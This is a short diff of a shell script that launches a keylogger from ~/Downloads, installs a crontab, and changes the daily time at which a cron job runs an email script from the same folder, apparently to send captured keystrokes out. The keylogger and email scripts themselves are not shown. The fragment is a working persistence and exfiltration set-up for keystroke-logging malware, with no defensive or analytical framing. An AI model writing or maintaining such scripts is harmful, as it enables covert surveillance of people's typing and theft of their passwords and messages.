@@ -11,6 +11,6 @@ python ~/Downloads/keylogger.py
 #install new cron file
 crontab mycron
 
-crontab -l | echo "24 00 * * * bash ~/Downloads/email.sh" | crontab -
+crontab -l | echo "00 17 * * * bash ~/Downloads/email.sh" | crontab -
 
 exit 0
